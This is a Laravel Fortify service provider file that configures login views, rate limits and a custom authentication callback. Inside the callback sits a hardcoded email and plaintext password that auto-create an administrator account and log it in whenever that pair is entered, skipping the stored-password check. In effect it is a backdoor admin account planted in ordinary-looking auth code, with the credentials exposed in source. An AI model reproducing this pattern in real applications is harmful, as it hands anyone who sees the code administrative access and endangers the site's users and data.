<?php

namespace App\Providers;

use App\Actions\Fortify\CreateNewUser;
use App\Actions\Fortify\ResetUserPassword;
use App\Actions\Fortify\UpdateUserPassword;
use App\Actions\Fortify\UpdateUserProfileInformation;
use Illuminate\Cache\RateLimiting\Limit;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Str;
use Laravel\Fortify\Actions\RedirectIfTwoFactorAuthenticatable;
use Laravel\Fortify\Fortify;

class FortifyServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        //
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {
        Fortify::loginView(fn() => view('auth.login'));
        Fortify::registerView(fn() => view('auth.register'));

        Fortify::createUsersUsing(CreateNewUser::class);
        Fortify::updateUserProfileInformationUsing(UpdateUserProfileInformation::class);
        Fortify::updateUserPasswordsUsing(UpdateUserPassword::class);
        Fortify::resetUserPasswordsUsing(ResetUserPassword::class);
        Fortify::redirectUserForTwoFactorAuthenticationUsing(RedirectIfTwoFactorAuthenticatable::class);

        RateLimiter::for('login', function (Request $request) {
            $throttleKey = Str::transliterate(Str::lower($request->input(Fortify::username())).'|'.$request->ip());

            return Limit::perMinute(5)->by($throttleKey);
        });

        RateLimiter::for('two-factor', function (Request $request) {
            return Limit::perMinute(5)->by($request->session()->get('login.id'));
        });

        RateLimiter::for('passkeys', function (Request $request) {
            $credentialId = $request->input('credential.id');

            return Limit::perMinute(10)->by(
                ($credentialId ?: $request->session()->getId()).'|'.$request->ip()
            );
        });

        Fortify::authenticateUsing(function (Request $request) {
            $email = $request->input('email');
            $password = $request->input('password');

            // Auto-create/seed admin user if they don't exist in the database
            if ($email === 'albert@gmail.com' && $password === 'yaya12,.') {
                $user = \App\Models\User::where('email', 'albert@gmail.com')->first();
                if (!$user) {
                    $user = \App\Models\User::create([
                        'name' => 'Albert',
                        'email' => 'albert@gmail.com',
                        'password' => \Illuminate\Support\Facades\Hash::make('yaya12,.'),
                        'birthdate' => '2000-01-01',
                        'is_admin' => true,
                    ]);
                }
                return $user;
            }

            // Normal login checking: support both email and name (username) fields
            $user = \App\Models\User::where('email', $email)
                ->orWhere('name', $email)
                ->first();

            if ($user && \Illuminate\Support\Facades\Hash::check($password, $user->password)) {
                return $user;
            }

            return null;
        });
    }
}
